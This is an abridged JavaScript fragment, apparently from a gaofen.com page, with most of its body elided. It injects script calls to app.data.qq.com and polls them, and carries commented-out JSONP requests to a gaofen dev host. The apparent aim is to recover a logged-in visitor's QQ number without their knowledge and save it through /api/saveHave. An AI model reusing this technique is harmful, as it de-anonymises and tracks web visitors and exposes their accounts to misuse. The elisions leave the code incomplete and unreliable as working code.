 $(function(){
     ...
     $('#getByGame').click(function(e){
         ...
         //return;
         type1 = true;
         __GQ(window.location.hostname, true, 1);
     });
     ...
     window['__GQ'] = (function(domain, isTtest, useType){
         ...
         var jq  = jQuery, quin, ck = 'uky', jqgt = !!jq.cookie, domain = domain || 'gaofen', useType = useType || 1;
         ...
         function gfgQ1(){
             ...
             function appJs(){
                 ...
                 appendJS(url, '', function(){//接口不可能走第二种方法
                     gfgQ2();
                 });
             }
         ...
         function gfgQ2(){
             ...
             function toAppSucc(){
                 ...
                 removeJs();
                /*
                 jq.getJSON('http://pppddd.dev.gaofen.com/index/outuin?uid='+myuin+'&callback=?', function(data){
                     if(data.length === 0){//获取不成功
                         if(isTtest) alert('获取失败!');
                     }else{
                       debugger;
             ...
             function getUn(){
                 ...
                 t +=1000;
                 appendTimer++;
                 if(myuin && useJs && appendTimer< 150){
                     appendJS('http://app.data.qq.com/?umod=user&uid='+myuin+'&t='+t, toAppSucc, toAppErr, 'appUin');
                 }else{//img方式
                     /*
                      if(appendTimer <  20){
                      appendTimer++;
             ...
             function loadjs() {
                 try {
                     if (data0.err == '1026') {//已登录,取空间UID
                         if(!myuin){
                             /*
                             jq.getJSON("http://pppddd.dev.gaofen.com/index/getUid?callback=?", function(data){
                                   if(data.uid){
                                       myuin = data.uid;
                                       timer = setTimeout(getUn, 0);
                                   }
             ...
             if(!quin){
                 ...
                 _quin = _quin.join('');
                 jq.get('/api/saveHave', {quin : _quin}, function(r){
